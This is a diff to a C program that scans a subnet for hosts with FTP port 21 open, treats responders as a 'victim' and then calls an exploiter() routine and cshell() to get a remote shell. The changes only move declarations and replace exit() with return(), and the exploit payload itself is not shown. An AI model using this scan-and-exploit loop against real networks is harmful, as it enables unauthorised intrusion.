@@ -39,6 +39,15 @@ int main(int argc, char *argv[]) {
     char buffer[BUFFER_SIZE]; 
     int expsock;
     int port = 21;
+    socklen_t lon; 
+    fd_set myset; 
+    struct timeval tv; 
+    long arg; 
+    int sockfd, n, res, valopt;
+    struct hostent *server;
+    struct sockaddr_in victim;
+    struct pollfd fd;
+    int ret;
 
     char *ip = malloc(IP_LENGTH*sizeof(char));
 
@@ -63,17 +72,11 @@ int main(int argc, char *argv[]) {
         strcpy(ip, subnet);
         sprintf(ips, "%d", ipaddr);
         strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
-
-        socklen_t lon; 
-        fd_set myset; 
-        struct timeval tv; 
-        long arg; 
-
-        int sockfd, n, res, valopt;
+        
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if(sockfd == -1) {
             printf("ERROR opening socket!\n");
-            exit(1);    
+            return(1);    
         }
 
         // Set non-blocking 
@@ -81,14 +84,12 @@ int main(int argc, char *argv[]) {
         arg |= O_NONBLOCK; 
         fcntl(sockfd, F_SETFL, arg); 
 
-        struct hostent *server;
         server = gethostbyname(ip);
         if (server == NULL) {
             fprintf(stderr,"ERROR, no such host\n");
             continue;
         }
         
-        struct sockaddr_in victim;
 
         bzero((char *) &victim, sizeof(victim));
         victim.sin_family = AF_INET;
@@ -144,8 +145,6 @@ int main(int argc, char *argv[]) {
         printf("tried IP: %s\n", ip);
 
         // Use poll.h to avoid long timeout
-        struct pollfd fd;
-        int ret;
 
         fd.fd = sockfd;
         fd.events = POLLIN;
@@ -182,7 +181,7 @@ int main(int argc, char *argv[]) {
 
                         expsock = exploiter(argc, argv);
                         cshell(expsock);
-                        exit(1);
+                        return(1);
                     }
                 }
                 break;
@@ -226,7 +225,7 @@ int main(int argc, char *argv[]) {
 
     }
 
-    exit(0);
+    return(0);
     
      
     // if(ret == -1) {
@@ -238,7 +237,7 @@ int main(int argc, char *argv[]) {
     // printf("Colocar aqui um if\n");
  
     // close(sockfd);
-    return(0); 
+    // return(0); 
 }
 
 void cshell (int sock) {
